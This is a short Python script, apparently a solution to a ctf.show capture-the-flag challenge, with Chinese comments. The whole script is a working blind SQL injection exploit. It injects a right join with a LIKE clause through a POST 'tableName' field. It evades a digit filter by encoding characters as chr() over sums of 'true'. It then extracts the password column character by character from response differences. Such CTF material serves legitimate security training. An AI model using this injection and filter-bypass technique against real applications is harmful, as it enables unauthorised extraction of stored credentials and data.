import requests

#str_to_num这个函数里 对true的运算 绕过数字的检测一个true就是1  2个true相加就是2 #true+true+true=3

def str_to_num(n):
    return ('true+'*n)[:-1]

def concat_str(s):
    res = ''  # 初始化空字符串
    for i in s:  # 遍历输入字符串的每个字符
        # 对每个字符执行以下操作：
        res += 'chr(' + str_to_num(ord(i)) + '),'  # 拼接为 chr(数值表达式),
    return res[:-1]  # 去掉最后一个逗号

url = "http://8e49be87-4729-42af-b3f8-f80d90d5d67c.challenge.ctf.show/select-waf.php"
str = "0123456789abcdef{}-_"
flag = "ctfshow"
for i in range(0,60):
    for j in str:
        res = concat_str(flag+j+'%')
        data = {"tableName":f"ctfshow_user as a right join ctfshow_user as b on b.pass like (concat({res}))"}
        r = requests.post(url=url, data=data).text
        if "$user_count = 43" in r:
            flag += j
            print(flag)
            if j=="}":
                exit()
            break